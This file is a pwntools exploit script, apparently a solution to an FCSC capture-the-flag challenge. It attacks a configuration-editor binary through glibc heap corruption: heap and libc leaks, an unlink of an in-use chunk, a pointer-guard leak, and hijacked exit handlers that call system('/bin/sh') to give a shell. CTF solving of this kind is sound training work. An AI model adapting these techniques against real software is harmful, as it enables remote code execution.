from pwn import *
from time import sleep
import re

context.terminal = ["gnome-terminal", "--window", "-x", "sh", "-c"]

DEBUG = False
WAIT_TIME = 0.7

LIBC = ELF("./libc.so.6")
LD = ELF("./ld-linux-x86-64.so.2")
LIBC_ROP = ROP(LIBC)

if DEBUG:
    # p = process("./editeur-de-configuration.back")
    p = process("./editeur-de-configuration")
    # gdb.attach(p, gdbscript="c")
    breakpoint = lambda: input("ok?")
else:
    p = remote("chall.fcsc.fr", 2103)
    breakpoint = lambda: 0


def pad(b, n):
    return b + b"\x00" * (n - (len(b) % n))


ENTRY_CHUNK_SIZE = 0x30
KEY_CHUNK_SIZE = 0x20
PTR_CHUNK_SIZE = 0x700

# Sizes with last null byte included
A_VALUE_SIZE = ENTRY_CHUNK_SIZE + 0x20
B_VALUE_SIZE = 0x10
C_VALUE_SIZE = 0x108

sleep(WAIT_TIME)


def import_config(name=None, level=None, team=None, elo=None, token=None):
    p.sendline(b"1")
    p.sendline(b"[PLAYER]")
    if name:
        p.send("name=")
        p.sendline(name)
    if level:
        p.send("level=")
        p.sendline(level)
    if team:
        p.send("team=")
        p.sendline(team)
    if elo:
        p.send("elo=")
        p.sendline(elo)
    if token:
        p.send("token=")
        p.sendline(token)
    p.sendline()
    sleep(WAIT_TIME)
    return p.recv()


def edit_config():
    p.sendline(b"2")
    sleep(WAIT_TIME)
    return p.recv()


def add_entry(key, value):
    p.sendline(b"1")
    p.send(key)
    p.send(b"=")
    p.sendline(value)
    sleep(WAIT_TIME)
    return p.recv()


def del_entry(key):
    p.sendline(b"2")
    p.sendline(key)
    sleep(WAIT_TIME)
    return p.recv()


def mod_entry(key, value):
    p.sendline(b"3")
    p.send(key)
    p.send(b"=")
    p.sendline(value)
    sleep(WAIT_TIME)
    return p.recv()


def mod_entry_extended(key, value):
    """
    Write `value` even if it contains zeroes.
    To achieve this, write multiple times.
    """
    ret = []
    offset = len(value)
    for v in value.split(b"\x00")[::-1]:
        offset -= len(v) + 1
        ret.append(mod_entry(key, offset * b"*" + v))
    return ret


# First allocate large enough chunk for getline ptr so it does not get in the way
print(import_config(token=b"-" * (PTR_CHUNK_SIZE - 0x10)).decode())
print(edit_config().decode())
print(del_entry(b"token").decode())

########################
# I. Leak heap address #
########################

print(add_entry(b"team", b"a" * 0x1F).decode())
print(add_entry(b"elo", b"b" * 0x2F).decode())

print(del_entry(b"team").decode())
print(del_entry(b"elo").decode())

response = add_entry(b"team", b"c" * 0x20 + b" " * 7)
print(response)
heap_leak = u64(pad(re.findall(rb"team = c{32}([^\s]*)\n", response)[0], 8))
print(f"Leaked heap address: 0x{heap_leak:016x}")

#########################################
# II. Unlink chunk that is still in use #
#########################################

# 1. Overwrite P to 0 in large chunk
print(add_entry(b"name", b"d" * 0x1F))
print(add_entry(b"level", b"e" * 0x4F7))
print(add_entry(b"elo", b"f" * 0x67))
print(del_entry(b"level"))
print(mod_entry(b"name", b"d" * 0x4F7))
print(mod_entry(b"elo", b"f" * 0x68))

# 2. Forge fake chunks
# chunk1->fd = chunk1->bk = chunk2
# God knows why there is one more null byte required...
fake_chunk_1 = (
    b"prevsize" + p64(0x31) + b"\x00" + 2 * p64(heap_leak + 0x690) + b"h" * 0x10
)
# chunk2->fd = chunk2->bk = chunk1
fake_chunk_2 = p64(0x30) + p64(0x30) + 2 * p64(heap_leak + 0x660) + b"i" * 0x10
print(b"\n".join(mod_entry_extended(b"elo", fake_chunk_1 + fake_chunk_2 + p64(0x30))))

print(del_entry(b"name"))

##########################
# III. Leak libc address #
##########################

print(add_entry(b"name", b"j" * 0x40F))
print(add_entry(b"token", b"k" * 0x33F))
print(del_entry(b"name"))
print(del_entry(b"token"))

print(del_entry(b"elo"))
response = add_entry(b"elo", b"l" * 0x40 + b" " * 0x27)
print(response)
libc_leak = u64(pad(re.findall(rb"elo = l{64}(.*)\n", response)[0], 8))
# The unsorted bin array is the first normal bin. Therefore its address is known.
print(f"Leaked libc address (adress of unsorted bin array): 0x{libc_leak:016x}")
LIBC.address = libc_leak - 0x21ACE0
print(f"Libc base address: 0x{LIBC.address:016x}")

#######################
# IV. Arbitrary write #
#######################

# Delete L and add it again to have correct entry's size
print(del_entry(b"elo"))
print(add_entry(b"elo", b"m" * 0x5F))

# Restore next free chunk's forward and backward pointers and its size
# Again, a null byte slips in but why, no idea...
print(
    b"".join(
        mod_entry_extended(
            b"elo", b"m" * 0x38 + p64(0x421) + b"\x00" + p64(libc_leak) + p64(libc_leak)
        )
    )
)

# Add new entry and change its size before deleting it
print(add_entry(b"name", b"n" * 0x40F))
print(b"".join(mod_entry_extended(b"elo", b"m" * 0x38 + p64(0x30))))
print(del_entry(b"name"))

# Add entry to pop N's entry_t from tcache bin, then another one to control entry_t
print(add_entry(b"name", b"o" * 0x2F))
print(add_entry(b"token", b"p" * 0x1F))
print(f"Fake chunk should be located at address 0x{heap_leak+0x660:016x}")

#########################
# V. Leak pointer guard #
#########################

# Leak ld.so address
response = mod_entry(b"elo", b"m" * 0x40 + p64(LIBC.got["_dl_argv"])[:6])
print(response)
ld_leak = u64(pad(re.findall(rb"token = (.{6})", response)[0], 8))
print(f"Leaked ld.so address: 0x{ld_leak:016x}")
LD.address = ld_leak - LD.sym["_dl_argv"]
print(f"ld.so base address: 0x{LD.address:016x}")

# Leak __pointer_chk_guard_local, a copy of __pointer_chk_guard but stored in ld.so's .data section
# This technique avoids leaking the fs register to get __pointer_chk_guard at fs:0x30
# As it turns out, this local copy is located just 0x10 bytes before _dl_argv!
# This can fail if there are null bytes in random value
response = mod_entry(b"elo", b"m" * 0x40 + p64(ld_leak - 0x10)[:6])
print(response)
pointer_guard = u64(re.findall(rb"token = (.{8})", response)[0])
print(f"Leaked pointer guard: 0x{pointer_guard:016x}")

mangle = lambda n: rol(n ^ pointer_guard, 0x11, word_size=0x40)

############################
# VI. Hijack exit handlers #
############################

# Use the fact that exit calls `cxafct (arg, status)`
# See https://elixir.bootlin.com/glibc/glibc-2.35/source/stdlib/exit.c#L113
# Overwrite __exit_funcs with custom exit_function of type ef_cxa
exit_funcs = LIBC.address + 0x21A838
print(f"__exit_funcs should be located at: 0x{exit_funcs:016x}")
exit_function_list_addr = LIBC.address + 0x21BF00
print(
    f"The first exit_function_list should be located at: 0x{exit_function_list_addr:016x}"
)

# We are not lucky because the first exit_function's argument would land on a 0x20-aligned address :(
# Overwrite cur->idx to 2
print(mod_entry(b"elo", b"m" * 0x40 + p64(exit_function_list_addr + 0x8)[:6]))
print(mod_entry(b"token", b"\x02"))

# Overwrite cur->flavor to ef_cxa
print(mod_entry(b"elo", b"m" * 0x40 + p64(exit_function_list_addr + 0x30)[:6]))
print(mod_entry(b"token", b"\x04"))

# Overwrite cur->fn to system
print(mod_entry(b"elo", b"m" * 0x40 + p64(exit_function_list_addr + 0x38)[:6]))
print(mod_entry(b"token", p64(mangle(LIBC.sym["system"]))))

# Overwrite cur->arg to "/bin/sh"
print(mod_entry(b"elo", b"m" * 0x40 + p64(exit_function_list_addr + 0x40)[:6]))
print(mod_entry(b"token", p64(LIBC.address + 0x1D8678)))

#####################
# VII. Restore heap #
#####################

# Dont forget to restore corrupt chunk afterwards, or sigabrt when freeing stuff at the end
# Check out final step on diagram
# Double frees in tcache are checked against. One bypass is to craft a fake chunk just to free it

# Craft chunk in fake chunk and write its address to chunk M's `next` field
# Still needing to duplicate some bytes because of the weird bug -> tofix
fake_chunk = b"prevsize" + p64(0x21) + b"\x00" + b"n" * 0x1F
print(
    b"\n".join(
        mod_entry_extended(
            b"elo",
            fake_chunk + b"pprevsize" + p64(0x31) + p64(heap_leak + 0x660 + 0x10)[:6],
        )
    )
)
sleep(WAIT_TIME)

# Exit
p.sendline(b"4")
sleep(WAIT_TIME)
p.sendline(b"3")

# Shell :)
p.interactive()
